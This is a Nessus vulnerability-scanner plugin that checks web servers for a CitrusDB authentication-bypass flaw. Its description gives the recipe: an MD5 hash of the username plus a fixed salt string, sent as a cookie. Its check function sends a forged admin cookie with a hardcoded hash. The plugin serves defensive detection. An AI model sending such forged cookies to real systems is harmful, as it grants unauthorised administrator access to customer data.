#
# (C) Tenable Network Security
#

if(description)
{
 script_id(16477);
 script_bugtraq_id(12560, 12557);
 script_version("$Revision: 1.3 $");

 name["english"] = "CitrusDB Remote Authentication Bypass Vulnerability";

 script_name(english:name["english"]);
 
 desc["english"] = "
The remote host is running CitrusDB, an open source customer database
application written in PHP.


This version of CitrusDB is vulnerable to an Authentication bypass 
vulnerability in the way it handles cookies based authentication.

An attacker, to exploit this flaw, needs to know a valid username.
By default CitrusDB comes with admin user. An attacker will just need
to send a MD5 hash of username + 'boogaadeeboo' as cookie to be
authenticated as administrator.

Solution : Upgrade to a newer version when available
Risk factor : High";



 script_description(english:desc["english"]);
 
 summary["english"] = "Determines the presence of CitrusDB";

 script_summary(english:summary["english"]);
 
 script_category(ACT_GATHER_INFO);
 
 script_copyright(english:"This script is Copyright (C) 2005 Tenable Network Security");
 script_family(english:"CGI abuses");
 
 script_dependencies("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if ( ! port ) exit(0);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

function check(url)
{
 req = string ("GET ", url, "/main.php HTTP/1.1\r\n","Host: ", get_host_name(), "\r\n", "Cookie: user_name=admin; id_hash=4b3b2c8666298ae9771e9b3d38c3f26e\r\n\r\n");
 res = http_keepalive_send_recv(port:port, data:req);
 if ( res == NULL ) exit(0);
 if ( "<!-- Copyright (C) 2002  Paul Yasi <paul@citrusdb.org>, read the README file for more information -->" >< res ) 
 {
        security_hole(port);
        exit(0);
 }
}


check(url:"/citrusdb");
foreach dir ( cgi_dirs() )
{
  check(url:dir);
}

